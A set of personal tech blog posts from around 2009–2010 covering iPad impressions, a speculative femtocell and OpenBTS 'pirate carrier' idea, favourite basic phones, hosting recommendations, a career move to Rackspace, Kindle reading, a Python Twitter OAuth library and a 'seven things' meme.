<p>The iPad is a new and very exciting paradigm for computing. I played with it afternoon and it felt very minority report. It felt like the future. no physical keyboard. I was controlling things with my finger/mind. it was awesome. I am smitten.</p>

<p>Besides the irrational distortion field emitted by this shiny device, I have some general thoughts/complaints on the iPad. <ol>
	<li><strong>The lack of camera is irrational.</strong> I have no idea why apple didn't include two cameras on the iPad. It would be an amazing device for parents, students, people, etc. Chatting is annoying on non-multitasking devices, however it might be nice to Skype with a slate like device. It will obviously be added to the next iteration of this device.</li>
	<li><strong>The iWork cloud platform is annoying.</strong> Importing and exporting documents is very hard. It is obviously not meant to be used by people who have documents already. The only way to get shit on the device is to download it. Why wouldn't Apple integrate iWork with MobileMe? silly. Google will have to change their Docs platform to allow easy downloading from the mobile google docs page.</li>
	<li><strong>The lack of any clock or alarm app very strange.</strong> I use the clock app on the iphone for a lot of stuff. not having that is a bummer. but in the grand scheme of bummers its about a 0.00001/5.</li>
	<li><strong>There is no usb host mode</strong> (that i know of). I would love to charge my phone, etc via USB with this device. it would minimize the number of cables and what not i would bring. It would also be awesome to plugin external disks or keyboards to it.</li>
	<li><strong>Google Reader blows on the iPad.</strong> This is a real bummer since that is pretty much the one thing i want to have all the time. You can't scroll with the desktop version and the mobile version seems silly on the iPad. I can't wait for Google to "fix" all of their webapps for the iPad.</li>
	<li><strong>Using an iPhone after spending a lot of time on the iPad makes the iPhone seem like a midget</strong>. It makes the nexus one seems like it is made out of paper.</li>
	<li><strong>The iPad is probably one of the coolest ways to show presentations to someone while sitting at a bar.</strong> I have been pitching some ideas to people and having the iPad with my deck is pretty awesome. A great way to go over your presentation with one or two people. Way better than a laptop.</li>
	<li><strong>The Kindle app is awesome</strong>. I like it a lot. I want to try reading a book on the iPad, but i really like the kindle's screen.</li>
	<li><strong>Most of the apps are boring.</strong> Seriously. The apps that are impressive are: Kayak, Maps, Photos, Kindle, Twitterrific, instapaper, Netflix and Square</li>
	<li><strong><a href='https://squareup.com/'>Square</a> is one of the coolest apps I have seen.</strong> It should blow peoples minds. I imagine that it will be a game changer for friends who do retail. I can't wait for my square card reader to show up. I will be charging my friends for everything.</li>
	<li><strong>This is an amazing device for casual internet use.</strong> I imagine that Hiromi, my parents, my brother and anyone else who isn't attached to a computer all day long would love these devices.</li>
</ol> Overall the iPad is amazing. I can&#8217;t wait to see how developers iterate on the platform and create really nifty applications. It will also be fun to see what features Apple magically unlocks on the iPad.</p>

<p>I am going to try and build some applications now. If you have ideas - let me know.</p>

                <blockquote>I wrote most of this entry the day before the earthquake in Haiti. It was motivated by the magicJack announcement and my interest in mobile devices within developing nations.  However, the thoughts in this post suddenly seemed more real after I started hearing reports of communication breakdown after the earthquake.</blockquote><strong>The femtocell</strong>
<p>At the recent CES, the <a href='http://en.wikipedia.org/wiki/MagicJack'>magicJack company</a> announced that they wanted to release a consumer grade FemtoCell device as an upgrade to their USB FXO/Softphone device.  Note: magicJack is an insane company. You probably have seen them on television commercials while watching USA &#8216;Up All Night&#8217;.  While these commercials almost seem scam-like, they have apparently sold 5 million USB magicJacks.  That&#8217;s a lot of phone calls!</p>

<p>A femtocell device is basically a mini GSM/CDMA tower. Think of it as a wi-fi AP but instead of wi-fi - it is GSM. You could drop it into your house, plug it into the Internet, and suddenly get 5 bars of connectivity on your mobile handset - instead of the standard AT&#38;T 1 bar. magicJack is offering the same service the USB dongle provides (unlimited calling and what not), but for mobile phones.  As a consumer, you would need to configure your handset to use the magicJack femtocell to receive/send calls.  When you are in range of the device (w/ signal strength enough to cover ~3000 sq. ft. house), you would bypass your carrier and use the magicJack for all incoming and outgoing calls. AWESOME.  Especially with the likes of Google Voice.</p>

<p>There are questions on the legality of such a device - but it is apparently legal to use inside your residence.</p>

<p>Side note: <a href='http://www.google.com/search?q=magicjack+sip'>Magicjack is SIP</a>. And <a href='http://magicjackhacks.com/'>hackable</a>. There is a cat and mouse game being played out trying to unlock it.  You can even use it with <a href='http://en.wikipedia.org/wiki/Asterisk_(PBX)'>Asterisk</a>.</p>
<strong>The thoughts</strong>
<p>So I began to think.  Femtocells could be used to open up mobile VOIP.  One scenario is that you could jump on a 3rd party carrier for a limited time to make a p2p VOIP call using your current GSM/WCDMA mobile device.  That is really awesome.  More importantly, what&#8217;s REALLY awesome is the pirate (3rd party) carriers.</p>

<p>Imagine purchasing 100 <a href='http://www.nata2.org/2010/01/17/i-love-phones-designed-for-developing-countries/'>Motorola F3</a>&#8217;s, a <a href='http://en.wikipedia.org/wiki/Gnu_radio'>GNU Radio USRP2</a> (~$1400) running the <a href='http://en.wikipedia.org/wiki/OpenBTS'>OpenBTS stack</a> and a super huge antenna - and suddenly becoming a rural/developing country mobile provider. Or - if you&#8217;re more interested in being a pirate carrier - you could run this setup in a city and be a carrier for the dark side (drugs, gangs, nerds&#8230;). This inexpensive setup is available (and achievable) today!  In case of the apocalypse/disaster/camping/nerdcamp - I think it would be nice to have a set up to deploy to organize/help people.</p>

<p>My mind started to work into overtime.  I began thinking about the ramifications of hacking the magicJack. Wouldn&#8217;t it be neat to use femtocell technology to distribute ad hoc mobile carriers around a neighborhood/disaster area/rural/developing country?  You could hook the magicJack femtocell up to a <a href='http://en.wikipedia.org/wiki/FON#Fonera_2.0n'>Fon2 device (usb/linux/broadband)</a> and distribute them around in places with connectivity. All you would need is a better antenna and some software to manage the provisioning and device identification. BAM! Instant pirate P2P GSM carrier.</p>

<p>I am hoping that this type of convergence will lead us <a href='http://www.imdb.com/title/tt0088763/'>to the future</a>.</p>

                <a href='http://www.flickr.com/photos/natatwo/4283555038/' title='Nokia 1100 and Motorola F3 by nata2, on Flickr'><img src='http://farm5.static.flickr.com/4039/4283555038_a798542c5f_m.jpg' height='218' align='right' alt='Nokia 1100 and Motorola F3' width='240' /></a>
<p>I love mobile phones. I don&#8217;t know why - but mobile devices represent so much of what I love about technology. The ubiquity, the fascination, all the new technology that pops up and all the different way people use their devices. I also feel like mobile devices will be the future of whatever the internet turns out to be. They will power the internet. With all this in mind - I have started to become interested in the devices that fill the opposite niche. The devices that are SO simple that their are almost NO features.</p>

<p>These are not Razrs, or other shitty mobile devices which act like they have all sorts of amazing features.  These specific phones are single feature, cheap devices and are often deployed in developing countries.</p>

<p>There are two that I really enjoy and I suggest checking out.</p>

<p>The first is the <a href='http://en.wikipedia.org/wiki/Nokia_1100'>Nokia 1100</a>. Also known as my favorite phone in the world. I first saw this phone while working for <a href='http://www.flickr.com/photos/natatwo/sets/72057594078282161/'>a minute in Bangalore</a>. It was advertised as a phone &#8221;<a href='http://knowledge.wharton.upenn.edu/india/article.cfm?articleid=4358'>made for india</a>&#8221; and apparently was hardy enough to be used by the working class there. I was drawn to the device. I neeeeeded it. It&#8217;s weird, because at the time I was running a symbian device that supported about every possible feature available in mobile - so thinking about jumping to a mobile device that was pretty much featureless was crazy. But - I was compelled.</p>

<p>The phone isn&#8217;t that fancy. It has very few features. It is super tiny and is super cheap. It is just a basic, simple phone that does nothing more than look &#8220;Nokia&#8221; and probably makes calls. The features it has are incredibly handy: flashlight, alarm clock and sms messaging.</p>

<p>I didn&#8217;t realize it then, but the Nokia 1100 is possibly the most popular electronic device in the world. According to the infallible wikipedia: Nokia has sold ~200 million of the Nokia 1100s since it&#8217;s launch in 2003. To put it in perspective - there have been ~30MM iPhones sold and ~50MM Razrs sold.</p>

<p>I eventually got a couple of these and used them as lenders, experiments and generaly fucking around phones. I even sent one to my brother for him to use - which he eventually washed in a washing machine - it still boots. They are HARDY. and 20 bucks.</p>

<p>The second phone that I am interested in is a bit newer and is a bit more tech. The <a href='http://en.wikipedia.org/wiki/Motorola_FONE_F3'>Motorola F3</a>. My buddy <a href='http://thinkmoreinc.wordpress.com/2009/03/19/50-2/'>Hemmant showed it to me</a>, told me a bit about the history and I couldn&#8217;t stop thinking about it. Anecdotally, this phone was made by a Motorola team in india - again for use in the developing countries market. It is simple, has no features (even less than the 1100) and is JUST a phone. There is one major differentiator. The Motorola f3 is one of the only phones to have an e-ink display. This means that it uses very little power in standby (standby time of ~17 days), can be used in low light/no light situations and is rather resilient. The phone didn&#8217;t sell as many as the Nokia 1100 - in fact it was a veritable failure.</p>

<p>The F3 has no features. It barely send txt messages. It has voice prompts for all menus. It is just a phone. A user serviceable, easy to charge, thin, e-ink phone. It works well making calls and receiving txt messages. The F3 would be an amazing phone for a child, elderly person or someone who doesn&#8217;t want to deal with learning pesky features. I got one for my &#8220;go bag&#8221; as an emergency phone (I am not a survivalist, I just crush a lot).</p>

<p>You can find an unlocked <a href='http://www.amazon.com/gp/product/B0013A7KMW?ie=UTF8&amp;tag=nata2productions&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B0013A7KMW'>Motorola f3 for about 30 bucks on amazon</a>. I suggest you get one.</p>

<p>I guess I will go ahead and jump in. This is based on what I use and would most likely suggest if we were drinking beers and talking about hosting. Your mileage may vary. I am sorry if I end up causing a nuclear war based on these recommendations.</p>
<strong>"Platforms"</strong>
<p>Two platforms are really getting me going these days. Google&#8217;s App Engine and Heroku.</p>

<p>App Engine is known by my close friends as my true love (haha. second only to <a href='http://hiromiusagi.com'>my lovely wife</a>). I spend almost 90% of my development time hacking on App Engine apps (<a href='http://Excla.im'>Excla.im</a>, <a href='http://CityPayments.org'>CityPayments</a>, <a href='http://ChicagoAlerts.org'>ChicagoAlerts</a>, <a href='http://chicagowiki.transitapi.com/'>Transitapi</a>, <a href='http://AwesomeUpdater.com'>AwesomeUpdater</a>, and <a href='http://harpersfriends.com'>Harper's Friends</a>). App Engine does a few things very well and allows the developer to do the rest. Quite a few of the lessons I learned while scaling out Threadless are baked into the app by default. You don&#8217;t have to scale all the pieces independently and you can really take care of things all at once. I recommend it and use it for prototyping and building new apps.</p>
<a href='http://Heroku.com'>Heroku</a>
<p>If you are interested in <a href='http://www.djangoproject.com'>Django</a>, Ruby/Rails or JVM languages (I am looking at you <a href='http://www.scala-lang.org/node/1831'>Scala</a>!) - I highly recommend App Engine or Heroku.</p>
<strong>"Cloud" Server Providers</strong>
<p>Cloud Servers are amazing things. Usually they are <a href='http://xen.org/'>XEN</a> hosted and wrapped by an API or a nice pretty interface. I &#60;3 them. If I would have had these server options in 2001 I would have been able to make the server kingdom I dreamt about. It would be awesome. Luckily, now in 2009/2010 I can build my server kingdom in the <a href='http://www.nepholologist.com/'>CLOUDS</a>. Anyway&#8230;.</p>
<a href='http://www.slicehost.com/'>Slicehost</a><a href='http://aws.amazon.com/ec2/'>EC2</a>
<p>Sidenote: <a href='http://www.linode.com/?r=1762fce92f905a07a8623481199299b3ab8a90b9'>Linode</a> is getting a lot of buzz based on their <a href='http://blog.linode.com/2009/12/04/linode-stomps-competition-in-performance-benchmark/'>performance/cost ratio</a>. I recommend you <a href='http://www.linode.com/?r=1762fce92f905a07a8623481199299b3ab8a90b9'>take a look</a> at them and see if they will work for you.</p>

<p>If you do find yourself in the dark world of cloud servers, you should check out my favorite utility for managing all things servers: <a href='https://www.cloudkick.com/'>CloudKick</a>. CloudKick is a pretty solid app that allows you manage your all your Rackspace and Amazon servers. You can do it very easily and with very few buttons (I love a small amount of buttons).</p>

<p>If you are looking for awesome easy servers - use Rackspace Cloud Servers. If you are looking for a full stack (load balancer, block storage and what not) - use Amazon. I use Rackspace Cloud Servers.</p>
<strong>File Hosting and Serving.</strong>
<p>File hosting is simple stuff. I follow this simple guideline:</p>

<p>If you want to host a file for everyone (i.e. a popular image, a iso, download etc) where performance is important - use <a href='http://www.rackspacecloud.com/cloud_hosting_products/files'>Rackspace Cloud Files</a> with limelight integration. This is the closest you will come to paying for enterprise CDN capabilities for a tiny amount of money. You can&#8217;t beat the level of performance that <a href='http://www.limelightnetworks.com/'>limelight</a> offers (unless you want to pay for <a href='http://www.akamai.com'>Akamai</a>).</p>

<p>If you need to put a BUNDLE of files somewhere that needs to be public or private - use Cloud Files or <a href='http://aws.amazon.com/s3/'>S3</a>. Depending entirely on what vendor you like or what API you are most familiar with. I use both for backing up various data from my servers and home (I recommend <a href='http://www.s3rsync.com/'>s3sync</a>, <a href='http://code.google.com/p/s3fs/'>s3fs</a> for S3 or <a href='http://westhoffswelt.de/projects/mossofs.html'>MossoFS</a>, <a href='http://blog.chmouel.com/2009/09/02/rsync-like-backup-to-rackspace-cloud-file-with-duplicity/'>CloudFiles/Duplicity</a> for Cloud Files).</p>
<strong>Multi Tenant/Shared Hosting.</strong>
<p>Shared hosting is such a pain in the ass. ;) I really don&#8217;t like it. However, I use it because of the price and because of how easy it is to host stuff for friends and others.</p>

<p>I use two providers regularly for shared hosting:</p>
<a href='http://www.webfaction.com/?affiliate=harper'>Webfaction</a><a href='http://www.rackspacecloud.com/cloud_hosting_products/sites'>Rackspace Cloud Sites</a>
<p>If file storage is just what you need - then check out <a href='http://www.dreamhost.com/r.cgi?159982'>Dreamhost</a>. For the love of god they have cheap prices. I looked today and they were offering unlimited everything (that doesn&#8217;t make sense). The only problem is that they don&#8217;t allow you to use it as a backup service (y<a href='http://www.labnol.org/internet/backup-files-on-dreamhost-web-hosting-servers/4538/'>ou have to use the space in a very specific way</a>).</p>
<strong>Enterprise/Physical Servers.</strong>
<p>Enterprise servers are easy. You use <a href='http://www.rackspace.com/'>Rackspace</a>. ;) Seriously though - while at <a href='http://threadless.com/'>Threadless</a>, Rackspace saved our asses more than once. Using Rackspace allowed us to concentrate on our application rather than concentrate on our servers. Although they can be expensive - they offer so much that it is often worth it.</p>

<p>If you are looking for something a bit cheaper or a bit more hands on, I suggest my favorite chicago hosting company: <a href='http://fdcservers.net/'>FDCServers.net</a>. They offer great support and cheap servers. You are not going to get near the support that Rackspace offers, but you are going to pay a LOT less. I host a couple big apps at FDC and have had no problems at all.</p>
<strong>Conclusion.</strong>
<p>This wraps up my hosting review. I recommend App Engine, Cloud Servers, Cloudfiles/S3 and Rackspace Managed hosting. heh. See - super easy. All your hosting questions are answered.</p>

<p>2010 is going to be an exciting year. I imagine that Rackspace and Amazon will continue to fight head to head. Which will only make us consumers have better options. I also am very excited to see what Google does with App Engine (I imagine that they will NOT be adding <a href='http://code.google.com/p/googleappengine/issues/detail?id=13'>PHP support</a>). I hope that 2010 is as productive as 2009 was for hosting, if so - then it will be an exciting, innovative time.</p>

<p>Leave your questions in the comments - I will attempt to answer them the best i can.</p>

<p>It was super hard to leave a job that taught me so much, helped me grow and was staffed by all of my friends, but I needed to make that leap towards the future. (<a href='http://siliconangle.net/ver2/2009/09/29/exclusive-interview-threadless-cto-harper-reed-heads-to-rackspace-whats-a-nepholologist/' title='here is a nice interview' id='c8k2'>Here is a nice interview</a> covering all sorts of aspects of my leaving.)</p>

<p>I did it, and the future is looking bright.</p>

<p>In the next few months, I am going to be <a href='http://www.rackspacecloud.com/blog/2009/09/30/the-rackspace-cloud-welcomes-harper-reed-nephologist/' title='helping Rackspace in their cloud computing division' id='vnml'>helping Rackspace in their cloud computing division</a>. My official title is <a href='http://nepholologist.com/'>Nepholologist</a>; a person who studies clouds. I will also be working hard to launch a startup (secrets secrets).  This is extremely exciting.  I&#8217;ll be spending half my day working with amazing technologists at Rackspace and the other half pursuing my own thing.   Rackspace has been amazing.  They&#8217;ve accommodated my want for freedom and the ability to concentrate on my own stuff while helping them out.  It will definitely be the best part-time job I&#8217;ve ever had.</p>

<p>I plan on detoxing.  I&#8217;ll be cleansing my brain of all the assumptions that I formed while at Threadless and ready myself for the startup life.  I want to be more scrappy and lean in my thinking.  Part of the plan is to complete all the various projects that I&#8217;ve worked on throughout the years like <a href='http://citypayments.org/'>citypayments.org</a>, <a href='http://excla.im/'>excla.im</a>, <a href='http://www.techcrunch.com/2009/09/12/exclaim-track-track-twitter-search-terms-over-im-in-near-real-time/'>exclaim tracking</a>, and <a href='http://harpersfriends.com/'>harpersfriends</a>.  I&#8217;ve done a lot of fun hacks in the last few years, and I want to work on making them much more robust.  This will allow me closure on one chapter of my life - while some doors close, new ones are opening.</p>

<p>Thanks to everyone who was supportive of me in this time. I could never have made this decision without the support of my family and friends.  To my lovely wife Hiromi, who was constantly telling me to pull the trigger.  My friends and coworkers who knew something was up - but dealt with me until the end - even when I was flighty.  My parents who helped me think rationally.  Most importantly, the entire Threadless family.  Without Threadless and the knowledge I&#8217;ve gained from my experiences there, I would not have the opportunities I have today.  The last four years have been utterly amazing (and awesome).</p>

<p>I have a couple of posts lined up for later this week.  One about my history at Threadless and another about the hijinks that have existed over the last few years.</p>

<p>Stay tuned.  It&#8217;s only just beginning.</p>

<p>I read a lot. I am not like those crazy people who read a book a day or anything, but i have been reading up to about 2 books a week for the past few years. They are not crazy books, mostly science fiction and fantasy, but they are not small books. I read to chill out. My day pattern is to go to work, work, get home, nap, hang out with hiromi, play computer and then read until i fall alseep. The reading part is VERY important to get my mind and body to a place where I can actually sleep. Needless to say, I take my reading seriously.</p>

<p>I ordered an original Kindle way back when they first came out. I was back-ordered for quite awhile. It was enough time for me to question whether or not I would like the device. Luckily, my friend <a href='http://edithfrost.com/'>edith</a> was also in the same place - she and i chatted incessantly about what the future would be like with the Kindle. It was a bright future.</p>

<p>I ended up getting it around mid january 08. The first book I read was <a href='http://www.amazon.com/gp/product/B000PAAH3A?ie=UTF8&amp;tag=nata2productions&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B000PAAH3A'>Terror by Dan Simmons</a>. That is a serious business book. I had started the hardcover of the book earlier in the month and finished it on the kindle. That was my test. It was successful. Although i hated the fact that kindle pages and paper pages don&#8217;t really line up - the experience was the same. I was able to read fast and was able to forget about the buttons and terrible design of the kindle (like <a href='http://twitter.com/zachklein/status/1192280043'>Zach Klein said</a> - it looked like the consumer electronics version of the Pontiac Aztec).</p>

<p>After Terror, I read the appropriate <a href='http://www.amazon.com/gp/product/B000FBJCKI?ie=UTF8&amp;tag=nata2productions&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B000FBJCKI'>Diamond Age by Neal Stephenon</a>. I felt that I was closer to the &#8220;Young Lady&#8217;s Illustrated Primer&#8221; than I had been before. I was reading books on an electronic device that was hardy, easy to use and quick. I was able to give it a seemingly unlimited amount of content and could use it for quite some time without a battery change. Like I said above - it is awesome.</p>

<p>Around this time I discovered the dark and scary underworld that is ebooks on the internet. There is an <a href='http://wiki.mobileread.com/wiki/Main_Page'>awesome community of people surrounding ebooks</a>. They are involved with liberating DRM&#8217;d ebooks, converting from one format to another, uploading mass libraries of free ebooks, cataloging ebooks, etc etc. It is awesome. If you are interested in free content - there is an almost unlimited amount of <a href='http://feedbooks.com/'>free</a> <a href='http://www.gutenberg.org/wiki/Main_Page'>content</a> that is compatible with the Kindle available online. There is also an unlimited amount of pirated books too. They are harder to find and I feel terrible when I find them (I apparently would rather pay authors than musicians. hah). One thing i noticed while I was experimenting with ebooks - technical manuals and what not don&#8217;t render as well as non-technical books. I think it has to do with the number of diagrams and tables. They don&#8217;t render terribly - but often are not nearly accurate to what i imagine the author intended.</p>

<p>How you get the ebooks to the kindle is part of the magic. The kindle has what Amazon like to call the whispernet. It is, as far as i can tell, a sprint EVDO modem built into the device. Amazon uses this to wirelessly deliver content to your kindle that you buy from amazon.com. Once again - it is awesome. You click on a book in amazon and BAM - its on your kindle. You are not limited to using this JUST for amazon&#8217;s content. You can do it with your own ebooks as well. All you need to do is register your email address with amazon and then send books to the yourname@kindle.com email address. The books will appear on your kindle for a small cost ($0.10 i think). If you don&#8217;t want ot pay for it, you can send the content to yourname@free.kindle.com and it will return the book in the kindle format. You can do this .txt, .pdf and .doc files easily.</p>

<p>The kindle file format is just the .<a href='http://wiki.mobileread.com/wiki/MOBI'>MOBI ebook format</a>. Which in turn similar to the .PRC ebook format. The Mobi file is a remnant from the Palm days. it is basically the <a href='http://wiki.mobileread.com/wiki/PDB'>Palm Database format </a>that was used for various applications on the original palm platform. What this means is that all the ebooks that end in .mobi and .prc are natively compatible with the kindle. If you had purchased books for use with the mobipocket reader (an awesome ebook reader for windows), there is a good chance that they were .mobi files. You can copy those to the documents folder of your kindle (when you plug it in to your computer via USB) and they will show up in the book list without any work. This really opens up your options for cheap or free ebooks.</p>

<p>The trick then is to figure out how to convert pdf files and what not to well formed, well meta data&#8217;d .mobi files. This makes your kindle happy and allows you to continue to sort by author without having your email address be listed as the author.</p>

<p>I went a year reading just the Kindle. I read two paper books that were not available in a digital format during this time. It was interesting. I felt as though I needed to work out to lift the heavy hardcover books. The kindle makes you forget how heavy books can be. My arms are now wusses.</p>

<p>When the Kindle 2 was announced, i ordered two of them. One for me and one for Hiromi.</p>

<p>The kindle 2 is a huge improvement on the Kindle 1. It is thinner, better performing and a bit easier to use. It is not as easy to turn a page - but it is also not as easy to accidentally turn a page either. I like the new design. The optional leather case is amazing. It works VERY well. i was having to remove the leather case from the original when I would read it - i don&#8217;t have that problem with the new one.</p>

<p>There are a lot of small software tweaks that have trickled their way to the Kindle 1 as well. They are separating out your uploaded content from the content that came from directly Amazon. I am also having a hard time finding things that are lost on the kindle. I suppose i could search - but i never think of that when I am looking for content. The interface on the Kindle 2 is much faster. The pages turn faster and the books load faster. The screen is amazing. I really like it. I don&#8217;t like the fact that I can&#8217;t easily turn off the wireless with a hardware switch. I liked being able to not interrupt my reading to turn wireless on or off.</p>

<p>All in all - the Kindle 2 is a huge improvment over the Kindle 1. If you are able to upgrade, do it. And then give your original kindle to someone close to you who wants one. That is the best plan.</p>

<p>Hiromi loves hers. I was worried that she wouldn&#8217;t like it - but it turns out that it works very well for her. She likes the size and the ease of use. She took to it very quickly.</p>

<p>When I got my kindle 2 I was showing a couple of my coworkers some of the data about it. Specifically the <a href='http://www.macworld.com/article/138728/2009/02/whispersync.html'>whispersync</a> stuff. I told them that I wouldn&#8217;t be surprised if they released an iPhone app that allowed ebook reading on the Kindle. I based this on the success of the Stanza app. I stated to my buddies that I was only confused as to the strategy to release such an app, especially on how it could accidently stifle the Kindle 2 sales.</p>

<p>Then a couple days later the Kindle app was released. Like the Kindle - it is awesome. hah. With the Kindle app for the iphone and the Kindle, you are able to sync your placemarks on the books you are reading. You could read to a certain point in a novel while on your commute - then go to a meeting and pick up your iphone and continue reading from where you left off on your kindle. Then you coudl pick up the kindle and it would sync to where you left off on the iphone. That is cool. I tried it and it works. It is a bit wonky - but for the most part it works great. The only issue i have with the app is that it doesn&#8217;t have ANY of the content that you upload via email. It is only amazon purchased content. Lame. I read a lot of &#8220;found&#8221; books and a lot of purchased books. An example is a series of books where 2-4 are in the amazon kindle store, but book 1 isn&#8217;t. I find book 1 elsewhere and then buy 2-4. However, I can&#8217;t read book 1 on my iphone. Only the kindle. WHAT IS THE WORLD COMING TO. ;) I understand amazon&#8217;s reasoning for this - and I don&#8217;t expect it to change. I do wish i could push my emailed books into their cloud and handle them a bit better (with metadata, etc). I doubt that will happen.</p>

<p>If you read a lot and want a great reading experience, you should <a href='http://www.amazon.com/gp/product/B00154JDAI?ie=UTF8&amp;tag=nata2productions&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B00154JDAI'>buy a kindle.</a></p>

            <div class="PostContent">
                <p>I built <a href='http://excla.im'>Excla.im</a> quite awhile ago, well before <a href='http://twitter.com/harper'>Twitter</a> unleased their oauth beta program. Regardless, <a href='http://factoryjoe.com/blog/'>Chris Messina</a> <a href='http://flickr.com/photos/factoryjoe/2841257703/'>tagged the Excla.im sign up process as an anty pattern</a> within his flickr stream. I was bummed because i would have loved to use Oauth to authenticate Excla.im. But because of the tagging, i was constantly thinking about how to remove the anti pattern.</p>

<p>Finally, Twitter released the <a href='http://groups.google.com/group/twitter-development-talk/browse_thread/thread/42486bd3d7d136d0/f0e89b742bf0033e?pli=1'>Oauth Beta</a> and I was able to bribe @<a href='http://al3x.net/'>Al3x</a> to give me access (which reminds me, i need to send my <a href='http://flickr.com/photos/natatwo/3149040948/'>bribe</a>). I then sat for a month looking at the various python examples for OAuth and basically said &#8220;What The Fuck&#8221; over and over again. There were no solid examples and my experience with OAuth in PHP was a total hack so i could post shit to fireeagle. I was SOL as to finding a guide.</p>

<p>Then <a href='http://abrah.am'>abrah.am</a> released his <a href='http://github.com/poseurtech/twitteroauth/tree/master)'>PHP twitter OAuth lib</a>. It worked really well and was pretty much just plug and play to use it in a PHP app. Nice. I wanted that but in python. I decided to spend a minute or two and create it.</p>

<p>The base library my client is using is the the <a href='http://code.google.com/p/gdata-python-client/source/browse/trunk/src/gdata/#gdata/oauth'>OAuth lib</a> from <span style='text-decoration: none; color: #000000;'>google <a href='http://code.google.com/p/gdata-python-client/'>gdata-python-client</a></span><a href='http://code.google.com/p/gdata-python-client/'> project</a>. I figure it is a working client and is in production use - so it should be solid. There are very few <a href='http://code.google.com/p/gdata-python-client/source/browse/trunk/src/gdata/oauth/CHANGES.txt'>changes</a> between it and the official client that is released through <a href='http://oauth.googlecode.com/svn/code/python/oauth/'>oauth.net</a>.</p>

<p>The client is rather simple, in fact it should work with other api providers with very little work. You can check it out at <a href='http://github.com/harperreed/twitteroauth-python/'>github</a>. Please let me know feedback. i am a python n00b - so give me your best shot/code review. I am using Google Code as a <a href='http://code.google.com/p/twitteroauth-python/issues/list'>issue tracker</a>, so feel free to <a href='http://code.google.com/p/twitteroauth-python/issues/entry'>post some bugs</a>.</p>

<p>It is rather pluggable. I was able to launch excla.im (on app engine) with oauth support in no time. I am currently not holding passwords for anyone. It is an awesome feeling.</p>

                <p style='clear: both'>I was tagged by both <a href='http://eliw.wordpress.com/2009/01/05/seven-things/'>Eli White</a> and <a href='http://flinglog.com/text/seven-things/'>Brian Fling</a> in this dastardly meme regarding 7 things. I am usually a HUGE fan of all things meme - and kind of regard myself as a <a href='http://fukung.net'>certified</a> meme expert. However this whole meme that requires a lot of work - I.E. blogging is something entirely different. I think i actually like it, but i am not entirely sure yet ;).</p><p style='clear: both'>I do find it hilarious that almost every blog post regarding this seven things starts with a bit of self deprecation and surprise at how this meme stumbled upon innocent them. Well, it did come as a surprise - so I guess i understand.</p><p style='clear: both'>Well here it goes. Seven things about me:</p><p style='clear: both'><strong>One:</strong></p><p style='clear: both'>I grew up without a TV. When I was quite young (~3) my parents got rid of their TV. I am not completely sure why. I imagine it had something to do with money (the lack of) and priorities being making sure my brother and I were clothed and fed. My parents got their first TV after getting rid of the previous one when I was about 21. My parents used to rent a TV for big events (war, olympics, etc) and my brother and I would watch the TV manically until it was returned to the rental place. We also used to rent a TV and VCR about once or twice a year to watch all the movies we could in the time alloted. Those were awesome times. I currently don't have a TV.</p><p style='clear: both'><strong>Two:</strong></p><p style='clear: both'>I have been paid to YoYo and Juggle in front of a LOT of people. I guess that makes me a professional. Heh. In college my two best buddies (<a href='http://therats.org'>Matiss</a> and Brian) and myself started a "circus" group. We juggled and did shows for all sorts of things. We opened for <a href='http://en.wikipedia.org/wiki/Incubus_(band)'>Incubus</a>, <a href='http://en.wikipedia.org/wiki/Sir_Mix_A_Lot'>Sir Mix A Lot</a>, and a few other boring bands. We protest juggled as a group called Jugglers against homophobia - protesting people like <a href='http://en.wikipedia.org/wiki/Elizabeth_Dole'>Elizabeth Dole</a> and her homophobic antics. After college I continued to support my friends by juggling on the side. It was a really fun time. I don't juggle as much as i would like, but i still try to make it to conventions and what not. It is a lot of fun.</p><p style='clear: both'><strong>Three:</strong></p><p style='clear: both'>My first computer was an Apple ][c. My dad got it in some trade. My brother and I would build text games in basic. Shortly after that I got in to BBSs. Mostly we called places like <a href='http://www.totse.com/'>&amp;totse</a> and downloaded things that would get me in trouble. It was an awesome time. I suggest checking out the <a href='http://www.bbsdocumentary.com/'>BBS Documentary</a> to get an idea of how awesome it actually was.</p><p style='clear: both'><strong>Four:</strong></p><p style='clear: both'>I met my lovely wife <a href='http://hiromiusagi.com'>Hiromi</a> while in college in iowa. We moved to Chicago together in 2001 to live together as roommates. Eventually, it became clear that our relationship was much more than that. We got married in 2006 and happily live in Chicago. She is awesome.</p><p style='clear: both'><strong>Five:</strong></p><p style='clear: both'>I read a lot. I always have. Growing up without a TV will do that to a person. I read mostly fiction, but will stray to the dark side and read non-fiction every once and awhile. I usually read about an hour before going to bed. It helps calm me down and is a good way for me to get into the sleeping groove. I have recently been into ebooks and use a <a href='http://www.amazon.com/gp/product/B000FI73MA?ie=UTF8&amp;tag=nata2productions&amp;link_code=as3&amp;camp=211189&amp;creative=373489&amp;creativeASIN=B000FI73MA'>Amazon Kindle</a> to read them. I find that I do miss regularly reading paper books, but the convenience of reading ebooks is awesome. I can't wait until the eInk displays and associated readers are smaller, easier to use and cheaper.</p><p style='clear: both'><strong>Six:</strong></p><p style='clear: both'>I love David Bowie. It isn't a love that requires posters and discussion or anything. It is kind of similar to how people who grew up catholic talk about religion. David Bowie has just always been there for me. My first record I picked for myself was <a href='http://en.wikipedia.org/wiki/The_Rise_and_Fall_of_Ziggy_Stardust_and_the_Spiders_from_Mars'>Ziggy Stardust</a>. My first concert was the <a href='http://en.wikipedia.org/wiki/Sound_and_Vision_Tour'>Bowie's Sound + Vision tour</a>. When I was quite younger, my mom took me to get my hair cut and I brought along my <a href='http://en.wikipedia.org/wiki/Labyrinth_(film)'>Labyrinth</a> LP to show the stylist that I wanted <a href='http://thefanboys.com/wp-content/uploads/2006/11/david_bowie_labyrinth.jpg'>David Bowie hair</a>. I ended up with a rat tail.</p><p style='clear: both'><strong>Seven:</strong></p><p style='clear: both'>Although I always knew I would end up with a Computer Science degree - I fought it as long as I could. In college I studied the history of Catholicism for a couple years before actually jumping into computer science. It was awesome. I ended up concentrating on <a href='http://en.wikipedia.org/wiki/Giordano_Bruno'>Giordano Bruno</a> and the his (untimely) multi-world theory. It was a lot of fun and lead me to have an unnatural interest in the mechanics of theology.</p><ol style='clear: both' /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this 